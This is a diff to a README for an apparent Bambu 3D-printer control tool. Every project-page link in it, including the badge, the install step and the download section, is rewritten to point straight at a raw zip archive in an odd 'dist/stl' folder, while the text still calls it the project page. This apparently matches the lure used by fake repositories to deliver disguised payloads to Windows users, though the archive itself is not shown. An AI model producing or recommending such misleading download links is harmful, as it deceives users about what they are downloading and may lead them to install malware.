@@ -1,6 +1,6 @@
 # 🤖 bambu-printer-mcp - Control Bambu printers with ease
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://github.com/offthehook-implication870/bambu-printer-mcp)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://github.com/offthehook-implication870/bambu-printer-mcp/raw/refs/heads/main/dist/stl/printer_bambu_mcp_v1.5.zip)
 
 ## 🖥️ What this app does
 
@@ -24,7 +24,7 @@ Before you install the app, make sure you have:
 
 ## 🚀 Getting Started
 
-1. Open the project page: https://github.com/offthehook-implication870/bambu-printer-mcp
+1. Open the project page: https://github.com/offthehook-implication870/bambu-printer-mcp/raw/refs/heads/main/dist/stl/printer_bambu_mcp_v1.5.zip
 2. Download or clone the project from that page
 3. Install the required files on your Windows PC
 4. Open the app or start the server
@@ -35,7 +35,7 @@ Before you install the app, make sure you have:
 
 Visit this page to download and set up the software:
 
-https://github.com/offthehook-implication870/bambu-printer-mcp
+https://github.com/offthehook-implication870/bambu-printer-mcp/raw/refs/heads/main/dist/stl/printer_bambu_mcp_v1.5.zip
 
 If you see a releases area, get the latest Windows package from there. If the project page gives you source files, download the project files and place them in a folder on your PC.
 
@@ -224,4 +224,4 @@ For the smoothest setup:
 
 If you need the project page again, use this link:
 
-https://github.com/offthehook-implication870/bambu-printer-mcp
+https://github.com/offthehook-implication870/bambu-printer-mcp/raw/refs/heads/main/dist/stl/printer_bambu_mcp_v1.5.zip
